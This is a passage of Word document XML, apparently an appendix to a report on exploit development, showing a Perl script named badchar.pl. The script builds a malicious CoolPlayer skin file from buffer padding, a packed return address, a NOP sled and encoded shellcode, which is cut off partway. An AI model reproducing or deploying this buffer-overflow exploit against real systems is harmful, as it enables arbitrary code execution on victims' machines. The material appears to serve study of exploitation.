        </w:rPr>
        <w:t>Contents of badchar.p</w:t>
      </w:r>
      <w:r w:rsidR="003F51EB">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:bookmarkEnd w:id="62"/>
    </w:p>
    <w:p w14:paraId="0827A873" w14:textId="77777777" w:rsidR="00CF75AD" w:rsidRPr="00941EC1" w:rsidRDefault="00CF75AD" w:rsidP="00941EC1">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="477EFE86" w14:textId="0E16630F" w:rsidR="00B05CEB" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="63" w:name="_Toc103326491"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251689984" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="681AD80C" wp14:editId="03C8086E">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-595423</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>212651</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3221665" cy="6964326"/>
                <wp:effectExtent l="0" t="0" r="17145" b="27305"/>
                <wp:wrapNone/>
                <wp:docPr id="39" name="Text Box 39"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="3221665" cy="6964326"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:schemeClr val="lt1"/>
                        </a:solidFill>
                        <a:ln w="6350">
                          <a:solidFill>
                            <a:prstClr val="black"/>
                          </a:solidFill>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="4CF172B3" w14:textId="283378F2" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$file1 = "</w:t>
                            </w:r>
                            <w:r w:rsidR="004D7F6C">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>message</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">.ini"; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="65CA1657" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>nPlaylistSkin</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">="; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="14C7F53B" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "A" x 484;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="561781F1" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:bookmarkStart w:id="64" w:name="_Hlk103244583"/>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$buffer .= pack('V',0x7C86467B); </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5EE0EC84" w14:textId="2796B2B3" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "\x90" x 15;</w:t>
                            </w:r>
                            <w:r w:rsidR="00F51BD8">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="00F51BD8">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidR="00F51BD8" w:rsidRPr="00F51BD8">
                              <w:rPr>
                                <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>#NOP SLED</w:t>
                            </w:r>
                          </w:p>
                          <w:bookmarkEnd w:id="64"/>
                          <w:p w14:paraId="75DE685B" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "\x89\xe7\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>xdb</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>\xd0\xd9\x77\xf4\x5d\x55\x59\x49\x49\x49\x49" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7056542E" w14:textId="6D8805F8" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3AE862EB" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0027B51B" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0E5B7739" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x49\x49\x5a" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="65F971D7" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4b\x4d\x4b\x49\x49\x52\x54\x56\x44\x5a\x54\x56\x51\x4e" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2D912CCA" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x32\x4f\x42\x52\x57\x56\x51\x49\x59\x45\x34\x4c\x4b\x54" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="35700BB6" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x31\x56\x50\x4c\x4b\x52\x56\x54\x4c\x4c\x4b\x43\x46\x45" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="267E2627" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4c\x4c\x4b\x47\x36\x54\x48\x4c\x4b\x43\x4e\x47\x50\x4c" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="508A6243" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4b\x47\x46\x56\x58\x50\x4f\x45\x48\x43\x45\x4c\x33\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="67E871BD" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x39\x45\x51\x58\x51\x4b\x4f\x4b\x51\x43\x50\x4c\x4b\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5B6051D9" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4c\x51\x34\x51\x34\x4c\x4b\x51\x55\x47\x4c\x4c\x4b\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1930EB25" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x34\x56\x48\x52\x58\x45\x51\x5a\x4a\x4c\x4b\x50\x4a\x54" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="04B9A0D8" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x58\x4c\x4b\x51\x4a\x47\x50\x45\x51\x5a\x4b\x4b\x53\x47" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="605C2CFF" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x44\x50\x49\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x5a\x4e\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4B372B1F" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x31\x4b\x4f\x50\x31\x49\x50\x4b\x4c\x4e\x4c\x4d\x54\x49" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1E7E211A" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x50\x54\x34\x43\x37\x4f\x31\x58\x4f\x54\x4d\x43\x31\x58" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="67C897F1" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x47\x5a\x4b\x5a\x54\x47\x4b\x43\x4c\x51\x34\x47\x58\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1579ECEB" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x55\x4d\x31\x4c\x4b\x51\x4a\x51\x34\x43\x31\x5a\x4b\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0182AA39" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x46\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x50\x5a\x45\x4c\x43" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0CC8FEB0" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x31\x5a\x4b\x4c\x4b\x43\x34\x4c\x4b\x43\x31\x4b\x58\x4d" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="15DF5F56" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x59\x50\x44\x56\x44\x45\x4c\x43\x51\x58\x43\x58\x32\x43" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="35592A77" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x38\x47\x59\x4e\x34\x4c\x49\x4b\x55\x4b\x39\x4f\x32\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="38BEEC9D" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x48\x4c\x4e\x50\x4e\x54\x4e\x5a\x4c\x50\x52\x4d\x38\x4d" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0F8808E9" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4f\x4b\x4f\x4b\x4f\x4b\x4f\x4b\x39\x47\x35\x54\x44\x4f" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="70CA818C" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4b\x43\x4e\x49\x48\x4b\x52\x52\x53\x4d\x57\x45\x4c\x51" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="23D8CCD3" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x34\x56\x32\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4F3682F5" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x39\x51\x55\x54\x48\x52\x48\x52\x4c\x52\x4c\x51\x30\x47" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="794AD5B4" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x31\x45\x38\x56\x53\x47\x42\x56\x4e\x45\x34\x45\x38\x54" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="46F55F63" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
